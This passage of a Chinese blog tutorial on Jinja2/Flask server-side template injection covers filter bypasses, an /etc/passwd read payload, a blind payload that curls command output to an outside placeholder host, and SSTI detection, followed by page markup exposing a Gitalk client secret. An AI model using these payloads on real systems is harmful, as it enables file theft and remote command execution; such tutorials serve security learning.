class="line">&quot;__class__&quot;</span><br><span class="line">3. join</span><br><span class="line">#将一个序列拼接成一个字符串，join (&#x27;|&#x27;)将令每一个元素被&#x27;|&#x27;隔开</span><br><span class="line">&quot;&quot;[[&#x27;__clas&#x27;,&#x27;s__&#x27;]|join] 或者 &quot;&quot;[(&#x27;__clas&#x27;,&#x27;s__&#x27;)|join]</span><br><span class="line">&lt;==&gt;</span><br><span class="line">&quot;&quot;[&quot;__class__&quot;]</span><br><span class="line">4. lower</span><br><span class="line">#转换成小写</span><br><span class="line">5. replace</span><br><span class="line">#替换字符串</span><br><span class="line">&quot;__claee__&quot;|replace(&quot;ee&quot;,&quot;ss&quot;) 构造出字符串 &quot;__class__&quot;</span><br><span class="line">&quot;__ssalc__&quot;|reverse 构造出 &quot;__class__&quot;</span><br><span class="line">6. string</span><br><span class="line">#将变量转换为字符串，这样就可以通过浏览器显示的符号构造出我们可利用的字符串、符号等</span><br><span class="line">().__class__   出来的是&lt;class &#x27;tuple&#x27;&gt;</span><br><span class="line">().__class__|string)[0] 出来的是&lt;</span><br><span class="line">7. list</span><br><span class="line">#转换成列表，可以与上面的string配合，就可以调用列表里面的方法取字符了</span><br><span class="line">(()|select|string|list).pop(0)</span><br></pre></td></tr></table></figure>
+<p>【资料查阅：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425" >SSTI模板注入绕过（进阶篇）<i class="fas fa-external-link-alt"></i></a>】</p>
+<h3 id="Ⅲ-关键字绕过"><a href="#Ⅲ-关键字绕过" class="headerlink" title="Ⅲ. 关键字绕过"></a>Ⅲ. 关键字绕过</h3><ol>
+<li><p><code>.</code>和<code>[]</code></p>
+<blockquote>
+<p>可用过滤器<code>attr</code>绕过，若<code>.</code>可用，还可以<code>__getitem__</code>绕过<code>[]</code>。</p>
+</blockquote>
+</li>
+<li><p><code>&quot;&quot;</code>和<code>_</code>绕过</p>
+<blockquote>
+<p><code>request.args</code>、<code>request.values</code>、<code>request.cookies</code> 是 flask 中的属性，为返回请求的参数，这里把path当作变量名，将后面的路径传值进来进而绕过了引号的过滤</p>
+</blockquote>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path=/etc/passwd</span><br><span class="line">=&gt;</span><br><span class="line">&#123;&#123; &#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><code>&#123;&#123;&#125;&#125;</code>绕过<blockquote>
+<p>用<code>&#123;%%&#125;</code>的左半边绕过</p>
+</blockquote>
+</li>
+</ol>
+<p><code>&#123;% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`whoami` ').read()=='p' %&#125;1&#123;% endif %&#125;</code></p>
+<h1 id="四、SSTI检测"><a href="#四、SSTI检测" class="headerlink" title="四、SSTI检测"></a>四、SSTI检测</h1><h2 id="1、Tplmap"><a href="#1、Tplmap" class="headerlink" title="1、Tplmap"></a>1、Tplmap</h2><h2 id="2、附表"><a href="#2、附表" class="headerlink" title="2、附表"></a>2、附表</h2><p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220916005446865-111172183.png"
+                       
+                 ><br>使用标志测试。如jinja2：<code>&#123;&#123;7+8&#125;&#125;</code>，如果输出<code>15</code>，则有可能存在SSTI漏洞。<br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220916011329647-1428250087.png"
+                       
+                 ><br>&lt;图源: <a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/icez/archive/2018/04/07/ssti_check_payload.html%3E" >https://www.cnblogs.com/icez/archive/2018/04/07/ssti_check_payload.html&gt;<i class="fas fa-external-link-alt"></i></a></p>
+
+                </div>
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/web/">web</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F/">渗透</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">常见漏洞</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到 QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="分享到微信"
+            data-tooltip-img-tip="微信扫一扫"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到微博"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2022/12/06/2022DASCTF-Sept-X-%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-web/"
+                                   title="2022DASCTF Sept X 浙江工业大学秋季挑战赛 web"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">2022DASCTF Sept X 浙江工业大学秋季挑战赛 web</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="gitalk-comment-container">
+        <div id="gitalk-container"></div>
+        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.css">
+        <script 
+                src="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        ></script>
+        <script 
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          window.KeepCommentPlugin.initGitalk = () => {
+            let gitalkPathname = decodeURI(location.pathname)
+            const gitalkPathnameLength = gitalkPathname.length
+            const gitalkPathnameMaxLength = 50
+            if (gitalkPathnameLength > gitalkPathnameMaxLength) {
+              gitalkPathname = gitalkPathname.substring(0, gitalkPathnameMaxLength - 3) + '...'
+            }
+
+            if (window?.Gitalk) {
+              new Gitalk({
+                clientID: 'Ov23liQm7PTQpK5JLa0h',
+                clientSecret: 'ba0525d7d59a301a09ac76ed9299df6ceb9a42a5',
+                repo: 'gitalk',
+                owner: 'ohvy',
+                admin: 'ohvy',
+                id: gitalkPathname,
+                proxy: '',
+                language: 'zh-CN'
+              }).render('gitalk-container')
+              window.KeepCommentPlugin.hideLoading()
+            } else {
+              setTimeout(() => {
+                window.KeepCommentPlugin.initGitalk()
+              }, 1000)
+            }
+          }
+
+          if ('false' === 'true') {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initGitalk()
+            }, 1200)
+          } else {
+            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initGitalk)
+          }
+        </script>
+    </div>
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81SSTI%E7%AE%80%E4%BB%8B"><span class="nav-text">一、SSTI简介</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81SSTI%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="nav-text">1、SSTI产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81SSTI%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7-Tplmap"><span class="nav-text">2、SSTI检测工具 Tplmap</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81SSTI-%E5%88%A9%E7%94%A8"><span class="nav-text">二、SSTI 利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%85%A0-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">Ⅰ. 基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81Python-%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0"><span class="nav-text">1、Python 内建函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81Python-%E7%B1%BB%E7%BB%A7%E6%89%BF"><span class="nav-text">2、Python 类继承</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%85%A1-%E6%9E%84%E9%80%A0payload"><span class="nav-text">Ⅱ. 构造payload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E7%9B%B8%E5%85%B3%E5%B1%9E%E6%80%A7"><span class="nav-text">1、相关属性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84payload%E5%AF%BB%E6%89%BE%E8%BF%87%E7%A8%8B"><span class="nav-text">2、一个简单的payload寻找过程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%85%A0-%E6%89%BE%E5%88%B0-globals-%E5%85%A8%E5%B1%80"><span class="nav-text">Ⅰ. 找到__globals__全局</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%85%A1-%E6%9F%A5%E7%9C%8B%E5%85%B6%E5%BC%95%E7%94%A8-builtins"><span class="nav-text">Ⅱ. 查看其引用__builtins__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%85%A2-%E4%BD%BF%E7%94%A8%E5%8F%AF%E5%88%A9%E7%94%A8%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8A%9F%E8%83%BD%E7%AD%89"><span class="nav-text">Ⅲ. 使用可利用函数实现文件读取功能等</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E5%B8%B8%E7%94%A8%E7%9A%84%E7%9B%AE%E6%A0%87%E5%87%BD%E6%95%B0"><span class="nav-text">3、常用的目标函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">4、命令执行</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="nav-text">三、模板注入绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81%E8%AF%AD%E6%B3%95"><span class="nav-text">1、语法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81%E7%BB%95%E8%BF%87"><span class="nav-text">2、绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%85%A0-%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-text">Ⅰ. 字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%85%A1-%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="nav-text">Ⅱ. 过滤器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%85%A2-%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87"><span class="nav-text">Ⅲ. 关键字绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B%E3%80%81SSTI%E6%A3%80%E6%B5%8B"><span class="nav-text">四、SSTI检测</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81Tplmap"><span class="nav-text">1、Tplmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81%E9%99%84%E8%A1%A8"><span class="nav-text">2、附表</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box default">
+        
+            <div class="copyright-info info-item default">
+                &copy;&nbsp;<span>2022</span>&nbsp;-&nbsp;2024
+                
+                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Latte</a>
+                
+            </div>
+
+            <div class="theme-info info-item default">
+                由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+            </div>
+
+            
+
+            
+        
+
+        <div class="count-item info-item default">
+            
+
+            
+
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81SSTI%E7%AE%80%E4%BB%8B"><span class="nav-text">一、SSTI简介</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81SSTI%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="nav-text">1、SSTI产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81SSTI%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7-Tplmap"><span class="nav-text">2、SSTI检测工具 Tplmap</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81SSTI-%E5%88%A9%E7%94%A8"><span class="nav-text">二、SSTI 利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%85%A0-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">Ⅰ. 基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81Python-%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0"><span class="nav-text">1、Python 内建函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81Python-%E7%B1%BB%E7%BB%A7%E6%89%BF"><span class="nav-text">2、Python 类继承</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%85%A1-%E6%9E%84%E9%80%A0payload"><span class="nav-text">Ⅱ. 构造payload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E7%9B%B8%E5%85%B3%E5%B1%9E%E6%80%A7"><span class="nav-text">1、相关属性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84payload%E5%AF%BB%E6%89%BE%E8%BF%87%E7%A8%8B"><span class="nav-text">2、一个简单的payload寻找过程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%85%A0-%E6%89%BE%E5%88%B0-globals-%E5%85%A8%E5%B1%80"><span class="nav-text">Ⅰ. 找到__globals__全局</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%85%A1-%E6%9F%A5%E7%9C%8B%E5%85%B6%E5%BC%95%E7%94%A8-builtins"><span class="nav-text">Ⅱ. 查看其引用__builtins__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%85%A2-%E4%BD%BF%E7%94%A8%E5%8F%AF%E5%88%A9%E7%94%A8%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8A%9F%E8%83%BD%E7%AD%89"><span class="nav-text">Ⅲ. 使用可利用函数实现文件读取功能等</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E5%B8%B8%E7%94%A8%E7%9A%84%E7%9B%AE%E6%A0%87%E5%87%BD%E6%95%B0"><span class="nav-text">3、常用的目标函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">4、命令执行</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="nav-text">三、模板注入绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81%E8%AF%AD%E6%B3%95"><span class="nav-text">1、语法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81%E7%BB%95%E8%BF%87"><span class="nav-text">2、绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%85%A0-%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-text">Ⅰ. 字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%85%A1-%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="nav-text">Ⅱ. 过滤器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%85%A2-%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87"><span class="nav-text">Ⅲ. 关键字绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B%E3%80%81SSTI%E6%A3%80%E6%B5%8B"><span class="nav-text">四、SSTI检测</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81Tplmap"><span class="nav-text">1、Tplmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81%E9%99%84%E8%A1%A8"><span class="nav-text">2、附表</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/libs/anime.min.js"></script>
+
+<!-- local-search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/local-search.min.js"></script>
+
+
+<!-- lazyload -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/lazyload.min.js"></script>
+
+
+<div class="">
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/post/share.min.js"></script>
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
